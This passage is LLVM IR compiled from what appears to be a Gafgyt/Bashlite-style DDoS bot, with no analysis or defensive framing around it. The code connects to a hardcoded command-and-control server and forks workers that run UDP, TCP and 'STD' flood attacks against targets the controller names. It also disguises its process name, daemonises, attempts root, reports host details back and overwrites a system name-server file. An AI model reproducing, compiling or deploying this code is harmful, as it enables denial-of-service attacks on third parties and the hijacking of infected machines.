  %370 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #10
  store i8* %370, i8** %23, align 8
  br label %356, !llvm.loop !47

371:                                              ; preds = %356
  br label %383

372:                                              ; preds = %348
  %373 = call i32 @listFork()
  %374 = icmp ne i32 %373, 0
  br i1 %374, label %375, label %376

375:                                              ; preds = %372
  br label %617

376:                                              ; preds = %372
  %377 = load i8*, i8** %17, align 8
  %378 = load i32, i32* %18, align 4
  %379 = load i32, i32* %19, align 4
  %380 = load i32, i32* %20, align 4
  %381 = load i32, i32* %21, align 4
  %382 = load i32, i32* %22, align 4
  call void @SendUDP(i8* noundef %377, i32 noundef %378, i32 noundef %379, i32 noundef %380, i32 noundef %381, i32 noundef %382)
  call void @_exit(i32 noundef 0) #13
  unreachable

383:                                              ; preds = %371
  br label %384

384:                                              ; preds = %383, %281
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 0
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @strcmp(i8* noundef %387, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.520, i64 0, i64 0)) #11
  %389 = icmp ne i32 %388, 0
  br i1 %389, label %495, label %390

390:                                              ; preds = %384
  %391 = load i32, i32* %3, align 4
  %392 = icmp slt i32 %391, 6
  br i1 %392, label %423, label %393

393:                                              ; preds = %390
  %394 = load i8**, i8*** %4, align 8
  %395 = getelementptr inbounds i8*, i8** %394, i64 3
  %396 = load i8*, i8** %395, align 8
  %397 = call i32 @atoi(i8* noundef %396) #11
  %398 = icmp eq i32 %397, -1
  br i1 %398, label %423, label %399

399:                                              ; preds = %393
  %400 = load i8**, i8*** %4, align 8
  %401 = getelementptr inbounds i8*, i8** %400, i64 2
  %402 = load i8*, i8** %401, align 8
  %403 = call i32 @atoi(i8* noundef %402) #11
  %404 = icmp eq i32 %403, -1
  br i1 %404, label %423, label %405

405:                                              ; preds = %399
  %406 = load i32, i32* %3, align 4
  %407 = icmp sgt i32 %406, 5
  br i1 %407, label %408, label %414

408:                                              ; preds = %405
  %409 = load i8**, i8*** %4, align 8
  %410 = getelementptr inbounds i8*, i8** %409, i64 5
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @atoi(i8* noundef %411) #11
  %413 = icmp slt i32 %412, 0
  br i1 %413, label %423, label %414

414:                                              ; preds = %408, %405
  %415 = load i32, i32* %3, align 4
  %416 = icmp eq i32 %415, 7
  br i1 %416, label %417, label %424

417:                                              ; preds = %414
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 6
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* noundef %420) #11
  %422 = icmp slt i32 %421, 1
  br i1 %422, label %423, label %424

423:                                              ; preds = %417, %408, %399, %393, %390
  br label %617

424:                                              ; preds = %417, %414
  %425 = load i8**, i8*** %4, align 8
  %426 = getelementptr inbounds i8*, i8** %425, i64 1
  %427 = load i8*, i8** %426, align 8
  store i8* %427, i8** %24, align 8
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 2
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* noundef %430) #11
  store i32 %431, i32* %25, align 4
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 3
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* noundef %434) #11
  store i32 %435, i32* %26, align 4
  %436 = load i8**, i8*** %4, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 4
  %438 = load i8*, i8** %437, align 8
  store i8* %438, i8** %27, align 8
  %439 = load i32, i32* %3, align 4
  %440 = icmp eq i32 %439, 7
  br i1 %440, label %441, label %446

441:                                              ; preds = %424
  %442 = load i8**, i8*** %4, align 8
  %443 = getelementptr inbounds i8*, i8** %442, i64 6
  %444 = load i8*, i8** %443, align 8
  %445 = call i32 @atoi(i8* noundef %444) #11
  br label %447

446:                                              ; preds = %424
  br label %447

447:                                              ; preds = %446, %441
  %448 = phi i32 [ %445, %441 ], [ 10, %446 ]
  store i32 %448, i32* %28, align 4
  %449 = load i32, i32* %3, align 4
  %450 = icmp sgt i32 %449, 5
  br i1 %450, label %451, label %456

451:                                              ; preds = %447
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 5
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* noundef %454) #11
  br label %457

456:                                              ; preds = %447
  br label %457

457:                                              ; preds = %456, %451
  %458 = phi i32 [ %455, %451 ], [ 0, %456 ]
  store i32 %458, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %459 = load i8*, i8** %24, align 8
  %460 = call i8* @strstr(i8* noundef %459, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #11
  %461 = icmp ne i8* %460, null
  br i1 %461, label %462, label %482

462:                                              ; preds = %457
  %463 = load i8*, i8** %24, align 8
  %464 = call i8* @strtok(i8* noundef %463, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #10
  store i8* %464, i8** %31, align 8
  br label %465

465:                                              ; preds = %479, %462
  %466 = load i8*, i8** %31, align 8
  %467 = icmp ne i8* %466, null
  br i1 %467, label %468, label %481

468:                                              ; preds = %465
  %469 = call i32 @listFork()
  %470 = icmp ne i32 %469, 0
  br i1 %470, label %479, label %471

471:                                              ; preds = %468
  %472 = load i8*, i8** %31, align 8
  %473 = load i32, i32* %25, align 4
  %474 = load i32, i32* %26, align 4
  %475 = load i8*, i8** %27, align 8
  %476 = load i32, i32* %29, align 4
  %477 = load i32, i32* %28, align 4
  %478 = load i32, i32* %30, align 4
  call void @SendTCP(i8* noundef %472, i32 noundef %473, i32 noundef %474, i8* noundef %475, i32 noundef %476, i32 noundef %477, i32 noundef %478)
  call void @_exit(i32 noundef 0) #13
  unreachable

479:                                              ; preds = %468
  %480 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #10
  store i8* %480, i8** %31, align 8
  br label %465, !llvm.loop !48

481:                                              ; preds = %465
  br label %494

482:                                              ; preds = %457
  %483 = call i32 @listFork()
  %484 = icmp ne i32 %483, 0
  br i1 %484, label %485, label %486

485:                                              ; preds = %482
  br label %617

486:                                              ; preds = %482
  %487 = load i8*, i8** %24, align 8
  %488 = load i32, i32* %25, align 4
  %489 = load i32, i32* %26, align 4
  %490 = load i8*, i8** %27, align 8
  %491 = load i32, i32* %29, align 4
  %492 = load i32, i32* %28, align 4
  %493 = load i32, i32* %30, align 4
  call void @SendTCP(i8* noundef %487, i32 noundef %488, i32 noundef %489, i8* noundef %490, i32 noundef %491, i32 noundef %492, i32 noundef %493)
  call void @_exit(i32 noundef 0) #13
  unreachable

494:                                              ; preds = %481
  br label %495

495:                                              ; preds = %494, %384
  %496 = load i8**, i8*** %4, align 8
  %497 = getelementptr inbounds i8*, i8** %496, i64 0
  %498 = load i8*, i8** %497, align 8
  %499 = call i32 @strcmp(i8* noundef %498, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.521, i64 0, i64 0)) #11
  %500 = icmp ne i32 %499, 0
  br i1 %500, label %557, label %501

501:                                              ; preds = %495
  %502 = load i32, i32* %3, align 4
  %503 = icmp slt i32 %502, 4
  br i1 %503, label %516, label %504

504:                                              ; preds = %501
  %505 = load i8**, i8*** %4, align 8
  %506 = getelementptr inbounds i8*, i8** %505, i64 2
  %507 = load i8*, i8** %506, align 8
  %508 = call i32 @atoi(i8* noundef %507) #11
  %509 = icmp slt i32 %508, 1
  br i1 %509, label %516, label %510

510:                                              ; preds = %504
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 3
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @atoi(i8* noundef %513) #11
  %515 = icmp slt i32 %514, 1
  br i1 %515, label %516, label %517

516:                                              ; preds = %510, %504, %501
  br label %617

517:                                              ; preds = %510
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 1
  %520 = load i8*, i8** %519, align 8
  store i8* %520, i8** %32, align 8
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 2
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* noundef %523) #11
  store i32 %524, i32* %33, align 4
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 3
  %527 = load i8*, i8** %526, align 8
  %528 = call i32 @atoi(i8* noundef %527) #11
  store i32 %528, i32* %34, align 4
  %529 = load i8*, i8** %32, align 8
  %530 = call i8* @strstr(i8* noundef %529, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #11
  %531 = icmp ne i8* %530, null
  br i1 %531, label %532, label %548

532:                                              ; preds = %517
  %533 = load i8*, i8** %32, align 8
  %534 = call i8* @strtok(i8* noundef %533, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #10
  store i8* %534, i8** %35, align 8
  br label %535

535:                                              ; preds = %545, %532
  %536 = load i8*, i8** %35, align 8
  %537 = icmp ne i8* %536, null
  br i1 %537, label %538, label %547

538:                                              ; preds = %535
  %539 = call i32 @listFork()
  %540 = icmp ne i32 %539, 0
  br i1 %540, label %545, label %541

541:                                              ; preds = %538
  %542 = load i8*, i8** %35, align 8
  %543 = load i32, i32* %33, align 4
  %544 = load i32, i32* %34, align 4
  call void @SendSTD(i8* noundef %542, i32 noundef %543, i32 noundef %544)
  call void @_exit(i32 noundef 0) #13
  unreachable

545:                                              ; preds = %538
  %546 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #10
  store i8* %546, i8** %35, align 8
  br label %535, !llvm.loop !49

547:                                              ; preds = %535
  br label %556

548:                                              ; preds = %517
  %549 = call i32 @listFork()
  %550 = icmp ne i32 %549, 0
  br i1 %550, label %551, label %552

551:                                              ; preds = %548
  br label %617

552:                                              ; preds = %548
  %553 = load i8*, i8** %32, align 8
  %554 = load i32, i32* %33, align 4
  %555 = load i32, i32* %34, align 4
  call void @SendSTD(i8* noundef %553, i32 noundef %554, i32 noundef %555)
  call void @_exit(i32 noundef 0) #13
  unreachable

556:                                              ; preds = %547
  br label %557

557:                                              ; preds = %556, %495
  %558 = load i8**, i8*** %4, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 0
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @strcmp(i8* noundef %560, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.522, i64 0, i64 0)) #11
  %562 = icmp ne i32 %561, 0
  br i1 %562, label %599, label %563

563:                                              ; preds = %557
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %564

564:                                              ; preds = %590, %563
  %565 = load i64, i64* %37, align 8
  %566 = load i64, i64* @numpids, align 8
  %567 = icmp ult i64 %565, %566
  br i1 %567, label %568, label %593

568:                                              ; preds = %564
  %569 = load i32*, i32** @pids, align 8
  %570 = load i64, i64* %37, align 8
  %571 = getelementptr inbounds i32, i32* %569, i64 %570
  %572 = load i32, i32* %571, align 4
  %573 = icmp ne i32 %572, 0
  br i1 %573, label %574, label %589

574:                                              ; preds = %568
  %575 = load i32*, i32** @pids, align 8
  %576 = load i64, i64* %37, align 8
  %577 = getelementptr inbounds i32, i32* %575, i64 %576
  %578 = load i32, i32* %577, align 4
  %579 = call i32 @getpid() #10
  %580 = icmp ne i32 %578, %579
  br i1 %580, label %581, label %589

581:                                              ; preds = %574
  %582 = load i32*, i32** @pids, align 8
  %583 = load i64, i64* %37, align 8
  %584 = getelementptr inbounds i32, i32* %582, i64 %583
  %585 = load i32, i32* %584, align 4
  %586 = call i32 @kill(i32 noundef %585, i32 noundef 9) #10
  %587 = load i32, i32* %36, align 4
  %588 = add nsw i32 %587, 1
  store i32 %588, i32* %36, align 4
  br label %589

589:                                              ; preds = %581, %574, %568
  br label %590

590:                                              ; preds = %589
  %591 = load i64, i64* %37, align 8
  %592 = add i64 %591, 1
  store i64 %592, i64* %37, align 8
  br label %564, !llvm.loop !50

593:                                              ; preds = %564
  %594 = load i32, i32* %36, align 4
  %595 = icmp sgt i32 %594, 0
  br i1 %595, label %596, label %597

596:                                              ; preds = %593
  br label %598

597:                                              ; preds = %593
  br label %598

598:                                              ; preds = %597, %596
  br label %599

599:                                              ; preds = %598, %557
  %600 = load i8**, i8*** %4, align 8
  %601 = getelementptr inbounds i8*, i8** %600, i64 0
  %602 = load i8*, i8** %601, align 8
  %603 = call i32 @strcmp(i8* noundef %602, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.523, i64 0, i64 0)) #11
  %604 = icmp ne i32 %603, 0
  br i1 %604, label %606, label %605

605:                                              ; preds = %599
  call void @exit(i32 noundef 0) #14
  unreachable

606:                                              ; preds = %599
  %607 = load i8**, i8*** %4, align 8
  %608 = getelementptr inbounds i8*, i8** %607, i64 0
  %609 = load i8*, i8** %608, align 8
  %610 = call i32 @strcmp(i8* noundef %609, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.524, i64 0, i64 0)) #11
  %611 = icmp ne i32 %610, 0
  br i1 %611, label %617, label %612

612:                                              ; preds = %606
  call void @RemoveTempDirs()
  %613 = load i32, i32* @mainCommSock, align 4
  %614 = call i8* @getBuild()
  %615 = call i32 @getEndianness()
  %616 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %613, i8* noundef getelementptr inbounds ([19 x i8], [19 x i8]* @.str.525, i64 0, i64 0), i8* noundef %614, i32 noundef %615)
  br label %617

617:                                              ; preds = %612, %606, %551, %516, %485, %423, %375, %323, %257, %253, %230, %204, %169, %164, %136, %110, %75, %70, %43
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32 noundef) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

13:                                               ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.528 to i32), i32* %1, align 4
  br label %18

14:                                               ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.529 to i32), i32* %1, align 4
  br label %18

15:                                               ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.530 to i32), i32* %1, align 4
  br label %18

16:                                               ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.531 to i32), i32* %1, align 4
  br label %18

17:                                               ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.532 to i32), i32* %1, align 4
  br label %18

18:                                               ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 512, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* noundef %20, i8* noundef %24) #10
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strchr(i8* noundef %26, i32 noundef 58) #11
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

29:                                               ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %31 = call i8* @strchr(i8* noundef %30, i32 noundef 58) #11
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* noundef %32) #11
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %35 = call i8* @strchr(i8* noundef %34, i32 noundef 58) #11
  store i8 0, i8* %35, align 1
  br label %36

36:                                               ; preds = %29, %19
  %37 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #10
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 noundef %38, i8* noundef %39, i32 noundef %40, i32 noundef 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

44:                                               ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8* noundef, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i64 0, i64 0), i32 noundef 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i64 0, i64 0), i32 noundef 0) #10
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

8:                                                ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.527, i64 0, i64 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* noundef %9) #11
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 noundef %12, i8* noundef %13, i64 noundef %14)
  br label %17

16:                                               ; preds = %0
  br label %21

17:                                               ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 noundef %19)
  br label %21

21:                                               ; preds = %17, %16
  ret void
}

declare i32 @open(i8* noundef, i32 noundef, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8* noundef, i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i64 0, i64 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* noundef %28) #11
  %30 = call i8* @strncpy(i8* noundef %25, i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i64 0, i64 0), i64 noundef %29) #10
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i64 0, i64 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 noundef 15, i64 noundef %34, i32 noundef 0, i32 noundef 0, i32 noundef 0)
  %36 = call i64 @time(i64* noundef null) #10
  %37 = call i32 @getpid() #10
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 noundef %40) #10
  %41 = call i64 @time(i64* noundef null) #10
  %42 = call i32 @getpid() #10
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 noundef %45)
  %46 = call i32 @fork() #10
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

48:                                               ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 noundef %49, i32* noundef %9, i32 noundef 0)
  call void @exit(i32 noundef 0) #14
  unreachable

51:                                               ; preds = %2
  %52 = load i32, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %65, label %54

54:                                               ; preds = %51
  %55 = call i32 @fork() #10
  store i32 %55, i32* %8, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

57:                                               ; preds = %54
  call void @exit(i32 noundef 0) #14
  unreachable

58:                                               ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %62, label %61

61:                                               ; preds = %58
  br label %63

62:                                               ; preds = %58
  br label %63

63:                                               ; preds = %62, %61
  br label %64

64:                                               ; preds = %63
  br label %66

65:                                               ; preds = %51
  br label %66

66:                                               ; preds = %65, %64
  br label %67

67:                                               ; preds = %66
  %68 = call i32 @chdir(i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.534, i64 0, i64 0)) #10
  %69 = call i32 @setuid(i32 noundef 0) #10
  %70 = call i32 @seteuid(i32 noundef 0) #10
  %71 = call void (i32)* @signal(i32 noundef 13, void (i32)* noundef inttoptr (i64 1 to void (i32)*)) #10
  br label %72

72:                                               ; preds = %78, %67
  %73 = call i32 @fork() #10
  %74 = icmp eq i32 %73, 0
  br i1 %74, label %75, label %341

75:                                               ; preds = %72
  %76 = call i32 @initConnection()
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %80

78:                                               ; preds = %75
  %79 = call i32 @sleep(i32 noundef 5)
  br label %72

80:                                               ; preds = %75
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i8* @getBuild()
  %83 = call i32 @getEndianness()
  %84 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %81, i8* noundef getelementptr inbounds ([35 x i8], [35 x i8]* @.str.535, i64 0, i64 0), i8* noundef %82, i32 noundef %83)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %85

85:                                               ; preds = %339, %210, %174, %80
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %88 = call i32 @recvLine(i32 noundef %86, i8* noundef %87, i32 noundef 4096)
  store i32 %88, i32* %11, align 4
  %89 = icmp ne i32 %88, -1
  br i1 %89, label %90, label %340

90:                                               ; preds = %85
  store i32 0, i32* %12, align 4
  br label %91

91:                                               ; preds = %162, %90
  %92 = load i32, i32* %12, align 4
  %93 = sext i32 %92 to i64
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %96, label %165

96:                                               ; preds = %91
  %97 = load i32*, i32** @pids, align 8
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @waitpid(i32 noundef %101, i32* noundef null, i32 noundef 1)
  %103 = icmp sgt i32 %102, 0
  br i1 %103, label %104, label %161

104:                                              ; preds = %96
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %14, align 4
  br label %107

107:                                              ; preds = %123, %104
  %108 = load i32, i32* %14, align 4
  %109 = zext i32 %108 to i64
  %110 = load i64, i64* @numpids, align 8
  %111 = icmp ult i64 %109, %110
  br i1 %111, label %112, label %126

112:                                              ; preds = %107
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %14, align 4
  %115 = zext i32 %114 to i64
  %116 = getelementptr inbounds i32, i32* %113, i64 %115
  %117 = load i32, i32* %116, align 4
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %14, align 4
  %120 = sub i32 %119, 1
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds i32, i32* %118, i64 %121
  store i32 %117, i32* %122, align 4
  br label %123

123:                                              ; preds = %112
  %124 = load i32, i32* %14, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %14, align 4
  br label %107, !llvm.loop !51

126:                                              ; preds = %107
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = sub i32 %128, 1
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %127, i64 %130
  store i32 0, i32* %131, align 4
  %132 = load i64, i64* @numpids, align 8
  %133 = add i64 %132, -1
  store i64 %133, i64* @numpids, align 8
  %134 = load i64, i64* @numpids, align 8
  %135 = add i64 %134, 1
  %136 = mul i64 %135, 4
  %137 = call noalias i8* @malloc(i64 noundef %136) #10
  %138 = bitcast i8* %137 to i32*
  store i32* %138, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %139

139:                                              ; preds = %154, %126
  %140 = load i32, i32* %14, align 4
  %141 = zext i32 %140 to i64
  %142 = load i64, i64* @numpids, align 8
  %143 = icmp ult i64 %141, %142
  br i1 %143, label %144, label %157

144:                                              ; preds = %139
  %145 = load i32*, i32** @pids, align 8
  %146 = load i32, i32* %14, align 4
  %147 = zext i32 %146 to i64
  %148 = getelementptr inbounds i32, i32* %145, i64 %147
  %149 = load i32, i32* %148, align 4
  %150 = load i32*, i32** %13, align 8
  %151 = load i32, i32* %14, align 4
  %152 = zext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %150, i64 %152
  store i32 %149, i32* %153, align 4
  br label %154

154:                                              ; preds = %144
  %155 = load i32, i32* %14, align 4
  %156 = add i32 %155, 1
  store i32 %156, i32* %14, align 4
  br label %139, !llvm.loop !52

157:                                              ; preds = %139
  %158 = load i32*, i32** @pids, align 8
  %159 = bitcast i32* %158 to i8*
  call void @free(i8* noundef %159) #10
  %160 = load i32*, i32** %13, align 8
  store i32* %160, i32** @pids, align 8
  br label %161

161:                                              ; preds = %157, %96
  br label %162

162:                                              ; preds = %161
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %12, align 4
  br label %91, !llvm.loop !53

165:                                              ; preds = %91
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
